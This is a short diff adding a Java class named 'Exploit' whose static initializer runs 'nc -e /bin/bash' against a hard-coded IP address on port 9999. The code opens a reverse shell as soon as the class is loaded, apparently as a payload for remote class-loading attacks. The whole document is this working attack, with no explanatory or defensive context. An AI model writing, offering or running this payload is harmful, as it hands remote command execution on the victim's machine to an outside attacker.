@@ -1,0 +1,9 @@
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 68.183.237.161 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
